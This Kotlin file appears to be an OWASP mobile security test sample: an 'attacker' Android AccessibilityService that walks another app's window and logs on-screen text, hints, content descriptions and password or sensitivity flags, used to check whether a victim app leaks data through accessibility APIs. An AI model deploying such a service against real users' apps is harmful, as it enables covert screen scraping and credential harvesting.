package org.owasp.mastestapp

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

// SUMMARY: This attacker app uses a non-tool AccessibilityService to inspect
// accessibility data exposed by the victim MASTestApp.

class MastgTest(private val context: Context) {

    fun mastgTest(): String {
        context.startActivity(
            Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        )
        return "Enable Accessibility Attacker, then exercise the victim app."
    }
}

class MastgAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MASTG-A11Y"
        private const val TARGET_PACKAGE = "org.owasp.mastestapp"
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.packageName?.toString() != TARGET_PACKAGE) {
            return
        }

        logEvent(event)

        rootInActiveWindow?.let {
            logNode(it, 0)
        }
    }

    override fun onInterrupt() = Unit

    private fun logEvent(event: AccessibilityEvent) {
        val text = event.text
            ?.joinToString(separator = " | ")
            .orEmpty()

        val description = event.contentDescription
            ?.toString()
            .orEmpty()

        if (text.isNotEmpty() || description.isNotEmpty()) {
            Log.i(
                TAG,
                "event type=${event.eventType} " +
                    "text=$text " +
                    "contentDescription=$description"
            )
        }
    }

    private fun logNode(
        node: AccessibilityNodeInfo,
        depth: Int
    ) {
        val text = node.text?.toString().orEmpty()
        val description = node.contentDescription?.toString().orEmpty()
        val hint = node.hintText?.toString().orEmpty()
        val state = node.stateDescription?.toString().orEmpty()

        if (
            text.isNotEmpty() ||
            description.isNotEmpty() ||
            hint.isNotEmpty() ||
            state.isNotEmpty()
        ) {
            val sensitive =
                if (android.os.Build.VERSION.SDK_INT >= 34) {
                    node.isAccessibilityDataSensitive
                } else {
                    false
                }

            Log.i(
                TAG,
                "depth=$depth " +
                    "class=${node.className} " +
                    "password=${node.isPassword} " +
                    "sensitive=$sensitive " +
                    "text=$text " +
                    "contentDescription=$description " +
                    "hint=$hint " +
                    "state=$state"
            )
        }

        for (i in 0 until node.childCount) {
            node.getChild(i)?.let {
                logNode(it, depth + 1)
            }
        }
    }
}
